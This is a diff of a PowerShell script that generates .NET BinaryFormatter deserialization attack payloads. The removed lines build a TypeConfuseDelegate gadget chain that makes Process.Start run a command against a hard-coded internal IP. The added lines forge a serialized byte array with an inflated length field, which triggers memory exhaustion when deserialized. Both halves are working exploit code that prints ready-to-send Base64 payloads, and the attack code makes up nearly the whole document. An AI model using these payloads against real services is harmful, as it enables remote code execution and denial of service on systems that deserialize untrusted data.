@@ -1,51 +1,34 @@
-# --- Configuration ---
-$targetIp = "10.230.200.240"
-# Use a DNS collaborator domain if possible, or ping to test
-$command = "cmd.exe /c ping -n 2 $targetIp" 
-
 # --- Payload Construction ---
-Write-Host "[*] Building TypeConfuseDelegate payload..." -ForegroundColor Cyan
+Write-Host "[*] Building Memory Exhaustion payload..." -ForegroundColor Cyan
 
-# 1. Create a delegate for Process.Start(string, string)
-$processType = [System.Diagnostics.Process]
-$startMethod = $processType.GetMethod('Start', [Type[]]@([string], [string]))
-$startDelegate = [System.Delegate]::CreateDelegate([System.Comparison[string]], $startMethod)
+# 1. Create a tiny 1-byte array
+$byteArray = New-Object byte[] 1
+$byteArray[0] = 0x41 # 'A'
 
-# 2. Load the internal ComparisonComparer<string> type via Reflection
-$mscorlib = [System.Reflection.Assembly]::Load("mscorlib")
-$comparisonComparerType = $mscorlib.GetType("System.Collections.Generic.ComparisonComparer``1").MakeGenericType([string])
+# 2. Serialize it using BinaryFormatter
+$formatter = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+$ms = New-Object System.IO.MemoryStream
+$formatter.Serialize($ms, $byteArray)
+$payload = $ms.ToArray()
 
-# 3. Create an instance of ComparisonComparer<string> with the malicious delegate
-$comparisonDelegateType = [System.Comparison[string]]
-$constructor = $comparisonComparerType.GetConstructor([Type[]]@($comparisonDelegateType))
-$comparisonComparer = $constructor.Invoke(@($startDelegate))
-
-# 4. Set the internal _comparison field
-$delegateField = $comparisonComparerType.GetField('_comparison', [System.Reflection.BindingFlags]'NonPublic, Instance')
-$delegateField.SetValue($comparisonComparer, $startDelegate)
-
-# 5. Create a SortedSet and assign our malicious comparer
-# We use FormatterServices to create an empty SortedSet without triggering the comparer locally
-$sortedSetType = [System.Collections.Generic.SortedSet[string]]
-$sortedSet = [System.Runtime.Serialization.FormatterServices]::GetUninitializedObject($sortedSetType)
-
-# Use reflection to set the internal _comparer field of the SortedSet
-$comparerField = $sortedSetType.GetField('_comparer', [System.Reflection.BindingFlags]'NonPublic, Instance')
-$comparerField.SetValue($sortedSet, $comparisonComparer)
-
-# --- Serialization ---
-Write-Host "[*] Serializing object..." -ForegroundColor Cyan
-try {
-    $formatter = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
-    $ms = New-Object System.IO.MemoryStream
-    $formatter.Serialize($ms, $sortedSet)
-    
-    $payload = $ms.ToArray()
-    if ($payload.Length -eq 0) { throw "Serialization returned empty." }
-
-    $base64Payload = [Convert]::ToBase64String($payload)
-    Write-Host "[+] Payload generated successfully!" -ForegroundColor Green
-    Write-Host "Base64 Payload: $base64Payload"
-} catch {
-    Write-Host "[-] Error: $_" -ForegroundColor Red
+# 3. Find and modify the array length
+# The serialized format ends with the array data (0x41). 
+# The 4 bytes immediately preceding the data are the array length (00 00 00 01).
+$dataIndex = $payload.Length - 1
+if ($payload[$dataIndex] -eq 0x41) {
+    # Overwrite the length with 0x7FFFFFFF (2,147,483,647)
+    # This forces the deserializer to try allocating a massive array.
+    $payload[$dataIndex - 4] = 0x7F
+    $payload[$dataIndex - 3] = 0xFF
+    $payload[$dataIndex - 2] = 0xFF
+    $payload[$dataIndex - 1] = 0xFF
+    Write-Host "[+] Array length successfully modified to 2GB." -ForegroundColor Green
+} else {
+    Write-Host "[-] Could not locate array data. Payload generation failed." -ForegroundColor Red
+    exit
 }
+
+# 4. Output the payload as a Base64 string
+$base64Payload = [Convert]::ToBase64String($payload)
+Write-Host "[+] Payload generated successfully!" -ForegroundColor Green
+Write-Host "Base64 Payload: $base64Payload"
